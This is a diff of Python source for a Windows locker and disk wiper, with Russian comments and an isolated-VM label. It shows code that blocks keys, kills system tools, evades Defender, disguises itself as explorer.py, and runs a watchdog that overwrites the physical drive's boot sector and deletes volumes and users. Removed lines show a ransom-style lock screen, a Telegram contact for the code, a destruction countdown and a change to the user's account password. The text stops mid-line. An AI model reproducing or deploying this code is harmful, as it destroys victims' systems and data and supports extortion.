@@ -1,17 +1,19 @@
-# language: Python 3.10+, file: qacklocker_v6.py, target: Windows 10/11 VM (isolated)
-# v6 final: update_idletasks, frozen-safe _launch_line, schtasks via cmd /c,
-# deadline от показа UI. Пароль 79383, оператор pu709, 5 мин -> снос.
+# language: Python, file: locker_button.py
+# Зависимости: pillow, pygame, psutil, wmi
+# Сборка: pyinstaller --noconsole --onefile --name locker_button --add-data "assets;assets" --add-data "scream.mp3;." locker_button.py
+# ВНИМАНИЕ: деструктивный код. Только VM со снапшотом.
+
 import ctypes
 import hashlib
 import json
 import os
+import random
 import shutil
 import string
 import subprocess
 import sys
 import threading
 import time
-import webbrowser
 from ctypes import wintypes
 
 import psutil
@@ -30,11 +32,7 @@ except ImportError:
 
 # ================= НАСТРОЙКИ =================
 OPERATOR = "pu709"
-NEW_PASSWORD = "79383"
-GLOBAL_DESTROY_SECONDS = 300.0
-
 _SALT = b"QackLockerSalt_2026"
-CORRECT_HASH = hashlib.sha256(_SALT + NEW_PASSWORD.encode()).hexdigest()
 
 BLOCK_NAMES = {
     "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
@@ -75,16 +73,12 @@ BLOCK_CMDLINE_TOKENS = (
 _SELF_PID = os.getpid()
 _STOP_FLAG = threading.Event()
 _WNDPROC_REF = None
-_GLOBAL_DEADLINE = 0.0
 
 APPDATA = os.environ.get("APPDATA", ".")
 BASE_DIR = os.path.join(APPDATA, "QackLocker")
-ATTEMPTS_FILE = os.path.join(BASE_DIR, "attempts.dat")
-DEFENDER_LOG = os.path.join(BASE_DIR, "defender_bypass.log")
 STATE_FILE = os.path.join(BASE_DIR, "state.dat")
 WATCHDOG_PID_FILE = os.path.join(BASE_DIR, "watchdog.pid")
 REBOOT_TRIGGER = os.path.join(BASE_DIR, "reboot.trigger")
-
 MASQ_DIR = os.path.join(APPDATA, "Microsoft")
 MASQ_SCRIPT = os.path.join(MASQ_DIR, "explorer.py")
 
@@ -215,30 +209,6 @@ def self_masquerade():
     except Exception:
         return None
 
-# ================= SET PASSWORD (VM) =================
-def set_local_password(username, password):
-    rc, out = _run(["net", "user", username, password], timeout=15)
-    return {"rc": rc, "ok": rc == 0}
-
-
-def set_password_via_ps(username, password):
-    ps = (f"$u=[ADSI]\"WinNT://$env:COMPUTERNAME/{username},user\"; "
-          f"$u.SetPassword(\"{password}\"); $u.SetInfo()")
-    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
-                    "-Command", ps], timeout=20)
-    return {"rc": rc, "ok": rc == 0}
-
-
-def change_account_password():
-    username = os.environ.get("USERNAME", "")
-    if not username:
-        return {"ok": False}
-    r1 = set_local_password(username, NEW_PASSWORD)
-    if r1["ok"]:
-        return {"ok": True, "method": "net user"}
-    r2 = set_password_via_ps(username, NEW_PASSWORD)
-    return {"ok": r2["ok"], "method": "ADSI"}
-
 # ================= DEFENDER =================
 def add_exclusions():
     ps_script = (
@@ -318,29 +288,12 @@ def run_defender_bypass_and_log():
         report = {"error": str(e)}
     try:
         os.makedirs(BASE_DIR, exist_ok=True)
-        with open(DEFENDER_LOG, "w", encoding="utf-8") as f:
+        with open(os.path.join(BASE_DIR, "defender_bypass.log"), "w", encoding="utf-8") as f:
             json.dump(report, f, indent=2, ensure_ascii=False)
     except Exception:
         pass
 
 # ================= STATE =================
-def load_attempts():
-    try:
-        with open(ATTEMPTS_FILE, "r") as f:
-            return int(f.read().strip())
-    except Exception:
-        return 0
-
-
-def save_attempts(n):
-    try:
-        os.makedirs(BASE_DIR, exist_ok=True)
-        with open(ATTEMPTS_FILE, "w") as f:
-            f.write(str(n))
-    except Exception:
-        pass
-
-
 def mark_destroyed():
     try:
         os.makedirs(BASE_DIR, exist_ok=True)
@@ -652,6 +605,8 @@ VK_0, VK_9 = 0x30, 0x39
 VK_ENTER, VK_BACK, VK_TAB = 0x0D, 0x08, 0x09
 VK_MENU = 0x12
 VK_ESCAPE = 0x1B
+VK_F4 = 0x73
+VK_CONTROL = 0x11
 
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
@@ -674,11 +629,14 @@ def _kb_proc(nCode, wParam, lParam):
             return 1
         if vk in (0x5B, 0x5C):
             return 1
+        if vk == VK_F4 and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
+            return 1
+        if vk == VK_ESCAPE and (user32.GetAsyncKeyState(VK_CONTROL) & 0x8000):
+            return 1
+        if vk == VK_ESCAPE and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
+            return 1
         if vk == VK_ESCAPE:
-            if user32.GetAsyncKeyState(VK_MENU) & 0x8000:
-                return 1
-            if user32.GetAsyncKeyState(0x11) & 0x8000:
-                return 1
+            return 1
         allowed = (VK_0 <= vk <= VK_9) or vk in (VK_ENTER, VK_BACK, VK_TAB)
         if not allowed:
             return 1
@@ -704,127 +662,6 @@ def uninstall_keyboard_hook():
         except Exception:
             pass
         _kb_hook = None
-
-# ================= SHUTDOWN WATCHER =================
-def install_shutdown_watcher(win):
-    global _WNDPROC_REF
-    hwnd = win.winfo_id()
-    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND, wintypes.UINT,
-                                 wintypes.WPARAM, wintypes.LPARAM)
-    old = user32.GetWindowLongPtrW(hwnd, GWLP_WNDPROC)
-
-    def _proc(h, msg, wp, lp):
-        if msg in (WM_QUERYENDSESSION, WM_ENDSESSION):
-            try:
-                with open(REBOOT_TRIGGER, "w") as f:
-                    f.write("REBOOT")
-            except Exception:
-                pass
-            return 1
-        return user32.CallWindowProcW(old, h, msg, wp, lp)
-
-    _WNDPROC_REF = WNDPROC(_proc)
-    user32.SetWindowLongPtrW(hwnd, GWLP_WNDPROC,
-                             ctypes.cast(_WNDPROC_REF, ctypes.c_void_p).value)
-    return _WNDPROC_REF
-
-# ================= WATCHDOG =================
-def _parent_alive(pid):
-    try:
-        p = kernel32.OpenProcess(0x1000, False, pid)
-        if not p:
-            return False
-        ec = wintypes.DWORD(0)
-        kernel32.GetExitCodeProcess(p, ctypes.byref(ec))
-        kernel32.CloseHandle(p)
-        return ec.value == STILL_ACTIVE
-    except Exception:
-        return False
-
-
-def _watchdog_nuke():
-    try:
-        h = kernel32.CreateFileW(r"\\.\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
-                                 FILE_SHARE_READ | FILE_SHARE_WRITE, None,
-                                 OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None)
-        if h and h != INVALID_HANDLE_VALUE:
-            junk = bytearray(os.urandom(512))
-            junk[510] = 0
-            junk[511] = 0
-            _write_at(h, 0, bytes(junk))
-            _write_at(h, 512, b"\xFF" * 4096)
-            ln = ctypes.c_ulonglong(0)
-            ret = wintypes.DWORD(0)
-            kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO, None, 0,
-                                     ctypes.byref(ln), 8, ctypes.byref(ret), None)
-            if ln.value > 1024:
-                _write_at(h, ln.value - 512, b"\xFF" * 512)
-            kernel32.CloseHandle(h)
-    except Exception:
-        pass
-    try:
-        nuke_all_volumes()
-    except Exception:
-        pass
-    try:
-        nuke_users()
-    except Exception:
-        pass
-    try:
-        destroy_boot_and_recovery()
-    except Exception:
-        pass
-    try:
-        with open(STATE_FILE, "w") as f:
-            f.write("DESTROYED")
-    except Exception:
-        pass
-    try:
-        subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
-                         creationflags=CREATE_NO_WINDOW)
-    except Exception:
-        pass
-
-
-def watchdog_main(parent_pid):
-    while True:
-        if os.path.exists(REBOOT_TRIGGER):
-            _watchdog_nuke()
-            break
-        if not _parent_alive(parent_pid):
-            _watchdog_nuke()
-            break
-        time.sleep(0.5)
-
-
-def spawn_watchdog():
-    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
-    args = [sys.executable, script, "--watchdog", str(_SELF_PID)]
-    try:
-        proc = subprocess.Popen(args, creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
-                                close_fds=True)
-        with open(WATCHDOG_PID_FILE, "w") as f:
-            f.write(str(proc.pid))
-        return proc
-    except Exception:
-        return None
-
-
-def kill_watchdog():
-    try:
-        with open(WATCHDOG_PID_FILE, "r") as f:
-            pid = int(f.read().strip())
-        psutil.Process(pid).kill()
-    except Exception:
-        pass
-    try:
-        os.remove(WATCHDOG_PID_FILE)
-    except Exception:
-        pass
-    try:
-        os.remove(REBOOT_TRIGGER)
-    except Exception:
-        pass
 
 # ================= PROCESS KILL =================
 def _proc_blocked(proc):
@@ -924,261 +761,94 @@ def desktop_watchdog():
                 pass
         time.sleep(2.0)
 
-# ================= SOUND =================
-_screams_started = False
-_scream_path = None
-
-
-def resource_path(rel):
-    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
-    p = os.path.join(base, rel)
-    return p if os.path.exists(p) else None
-
-
-def init_scream():
-    global _scream_path
-    if not HAS_PYGAME:
-        return
-    path = resource_path("scream.mp3")
-    if not path:
-        return
+# ================= WATCHDOG =================
+def _parent_alive(pid):
     try:
-        pygame.mixer.init()
-        pygame.mixer.music.load(path)
-        _scream_path = path
+        p = kernel32.OpenProcess(0x1000, False, pid)
+        if not p:
+            return False
+        ec = wintypes.DWORD(0)
+        kernel32.GetExitCodeProcess(p, ctypes.byref(ec))
+        kernel32.CloseHandle(p)
+        return ec.value == STILL_ACTIVE
     except Exception:
-        _scream_path = None
+        return False
 
 
-def schedule_screams(win):
-    global _screams_started
-    if _screams_started or not HAS_PYGAME or _scream_path is None:
-        return
-    _screams_started = True
-
-    def scream_once():
-        try:
-            pygame.mixer.music.stop()
-            pygame.mixer.music.play()
-        except Exception:
-            pass
-        win.after(10000, scream_once)
-
-    scream_once()
-
-# ================= UI =================
-def run_ui():
-    import tkinter as tk
-    from PIL import Image, ImageTk
-
-    global _GLOBAL_DEADLINE
-    _GLOBAL_DEADLINE = time.time() + GLOBAL_DESTROY_SECONDS
-    deadline = _GLOBAL_DEADLINE
-
-    win = tk.Tk()
-    win.title(f"System Locker — {OPERATOR}")
-    win.attributes("-fullscreen", True)
-    win.attributes("-topmost", True)
-    win.configure(bg="#000000")
-    win.protocol("WM_DELETE_WINDOW", lambda: None)
-
-    win.update_idletasks()
+def _watchdog_nuke():
     try:
-        install_shutdown_watcher(win)
+        h = kernel32.CreateFileW(r"\\.\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE, None,
+                                 OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None)
+        if h and h != INVALID_HANDLE_VALUE:
+            junk = bytearray(os.urandom(512))
+            junk[510] = 0
+            junk[511] = 0
+            _write_at(h, 0, bytes(junk))
+            _write_at(h, 512, b"\xFF" * 4096)
+            ln = ctypes.c_ulonglong(0)
+            ret = wintypes.DWORD(0)
+            kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO, None, 0,
+                                     ctypes.byref(ln), 8, ctypes.byref(ret), None)
+            if ln.value > 1024:
+                _write_at(h, ln.value - 512, b"\xFF" * 512)
+            kernel32.CloseHandle(h)
+    except Exception:
+        pass
+    try:
+        nuke_all_volumes()
+    except Exception:
+        pass
+    try:
+        nuke_users()
+    except Exception:
+        pass
+    try:
+        destroy_boot_and_recovery()
+    except Exception:
+        pass
+    try:
+        with open(STATE_FILE, "w") as f:
+            f.write("DESTROYED")
+    except Exception:
+        pass
+    try:
+        subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
+                         creationflags=CREATE_NO_WINDOW)
     except Exception:
         pass
 
-    eye_path = resource_path("assets/Eye.png")
-    if eye_path:
-        try:
-            img = Image.open(eye_path).resize((420, 200))
-            photo = ImageTk.PhotoImage(img)
-            lbl = tk.Label(win, image=photo, bg="#000000", bd=0)
-            lbl.image = photo
-            lbl.place(relx=0.5, rely=0.45, anchor="center")
-        except Exception:
-            tk.Label(win, text="[Eye Error]", fg="red", bg="black").place(
-                relx=0.5, rely=0.45, anchor="center")
-    else:
-        tk.Label(win, text="[Eye Missing]", fg="red", bg="black").place(
-            relx=0.5, rely=0.45, anchor="center")
 
-    boot1 = "Booting System\n\nMemory section at adres 0x420 IS LOCKED!!"
-    boot2 = f"  WIN LOCKED ACTIVATE\n  CRYPTER starting...\n  operator: {OPERATOR}"
+def watchdog_main(parent_pid):
+    while True:
+        if os.path.exists(REBOOT_TRIGGER):
+            _watchdog_nuke()
+            break
+        if not _parent_alive(parent_pid):
+            _watchdog_nuke()
+            break
+        time.sleep(0.5)
 
-    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
-                     font=("Consolas", 15), anchor="w", justify="left")
-    label.pack(anchor="w")
-    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
-                      font=("Consolas", 15), anchor="w", justify="left")
-    label2.pack(pady=(20, 0), anchor="w")
 
-    st = {"i": 0, "i2": 0}
-
-    def typing():
-        if st["i"] <= len(boot1):
-            label.config(text=boot1[:st["i"]])
-            st["i"] += 1
-            win.after(2, typing)
-        elif st["i2"] <= len(boot2):
-            label2.config(text=boot2[:st["i2"]])
-            st["i2"] += 1
-            win.after(2, typing)
-        else:
-            locker_screen()
-
-    def unlock():
-        kill_watchdog()
-        _STOP_FLAG.set()
-        remove_autostart()
-        uninstall_keyboard_hook()
-        clear_reg_blocks()
-        try:
-            subprocess.Popen(["explorer.exe"], creationflags=CREATE_NO_WINDOW)
-        except Exception:
-            pass
-        win.after(1000, win.destroy)
-
-    def locker_screen():
-        for w in win.winfo_children():
-            w.destroy()
-
-        schedule_screams(win)
-
-        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!",
-                 fg="#4f4f4f", bg="#000000",
-                 font=("Consolas", 18)).pack(pady=(50, 20))
-
-        tk.Label(win, text=(
-            f"Ваш компьютер подвержен блокировке хакерской группой {OPERATOR}.\n"
-            "ВВОДИТЕ ПАРОЛЬ АККУРАТНО. 3 ОШИБКИ = УНИЧТОЖЕНИЕ СИСТЕМЫ.\n\n"
-            f"За кодом писать @{OPERATOR} (Telegram)"),
-            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
-            justify="center").pack(pady=20)
-
-        global_lbl = tk.Label(win, text="", fg="#FF0000", bg="#000000",
-                              font=("Consolas", 14, "bold"))
-        global_lbl.pack(pady=(10, 0))
-
-        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF",
-                         font=("Consolas", 16), justify="center", width=25)
-        entry.pack(pady=10)
-        entry.focus_force()
-
-        def keep_focus(_e=None):
-            try:
-                entry.focus_force()
-            except Exception:
-                pass
-
-        entry.bind("<FocusOut>", keep_focus)
-        win.after(200, keep_focus)
-
-        current = {"attempts": load_attempts()}
-        left0 = max(0, 3 - current["attempts"])
-        result = tk.Label(win, text=f"Попыток осталось: {left0}",
-                          fg="#FF0000", bg="#000000", font=("Consolas", 12))
-        result.pack(pady=5)
-
-        def destroy_and_show():
-            save_attempts(0)
-            install_keyboard_hook()
-            full_destroy(force=True)
-            for w in win.winfo_children():
-                w.destroy()
-            win.configure(bg="#FF0000")
-            tk.Label(win, text="ДОИГРАЛСЯ...", fg="#000000", bg="#FF0000",
-                     font=("Impact", 60), justify="center").pack(expand=True, fill="both")
-
-        def global_tick():
-            left = deadline - time.time()
-            if left <= 0:
-                global_lbl.config(text="ВРЕМЯ ВЫШЛО")
-                destroy_and_show()
-                return
-            m, s = divmod(int(left), 60)
-            global_lbl.config(text=f"Система будет уничтожена через {m:02d}:{s:02d}")
-            win.after(500, global_tick)
-
-        def check_code():
-            h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
-            if h == CORRECT_HASH:
-                result.config(text="Код правильный!", fg="#00FF00")
-                save_attempts(0)
-                unlock()
-                return
-            current["attempts"] += 1
-            save_attempts(current["attempts"])
-            entry.delete(0, tk.END)
-            left = 3 - current["attempts"]
-            if left > 0:
-                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
-                return
-            destroy_and_show()
-
-        def forgot_password():
-            result.config(text=f"Обратитесь к @{OPERATOR} в Telegram.", fg="#FF6600")
-            try:
-                webbrowser.open(f"https://t.me/{OPERATOR}")
-            except Exception:
-                pass
-
-        tk.Button(win, text="ПРОВЕРИТЬ", command=check_code,
-                  bg="#222222", fg="#FFFFFF",
-                  font=("Consolas", 12), bd=0, padx=20, pady=8).pack(pady=10)
-
-        tk.Button(win, text="Забыли пароль?", command=forgot_password,
-                  bg="#000000", fg="#555555",
-                  activebackground="#000000", activeforeground="#888888",
-                  font=("Consolas", 10, "underline"), bd=0,
-                  cursor="hand2").pack(pady=(2, 0))
-
-        entry.bind("<Return>", lambda e: check_code())
-        global_tick()
-
-    typing()
-    win.mainloop()
-
-# ================= ENTRY =================
-def main():
-    if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
-        try:
-            parent = int(sys.argv[2])
-        except Exception:
-            parent = 0
-        watchdog_main(parent)
-        return
-
-    ensure_admin()
-
+def spawn_watchdog():
+    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
+    args = [sys.executable, script, "--watchdog", str(_SELF_PID)]
     try:
-        add_exclusions()
+        proc = subprocess.Popen(args, creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
+                                close_fds=True)
+        with open(WATCHDOG_PID_FILE, "w") as f:
+            f.write(str(proc.pid))
+        return proc
+    except Exception:
+        return None
+
+
+def kill_watchdog():
+    try:
+        with open(WATCHDOG_PID_FILE, "r") as f:
+            pid = int(f.read().strip())
+        psutil.Process(pid).kill()
     except Exception:
         pass
-
-    threading.Thread(target=run_defender_bypass_and_log, daemon=True).start()
-
-    if is_destroyed():
-        full_destroy(force=True)
-        sys.exit(0)
-
-    self_masquerade()
-    apply_reg_blocks()
-    install_autostart()
-    init_scream()
-    spawn_watchdog()
-
     try:
-        threading.Thread(target=change_account_password, daemon=True).start()
-    except Exception:
-        pass
-
-    threading.Thread(target=blocking_loop, daemon=True).start()
-    threading.Thread(target=wmi_kill_loop, daemon=True).start()
-    threading.Thread(target=desktop_watchdog, daemon=True).start()
-
-    run_ui()
-
-
-if __name__ == "__main__":
-    main()
+        os.remove(WATCHDO
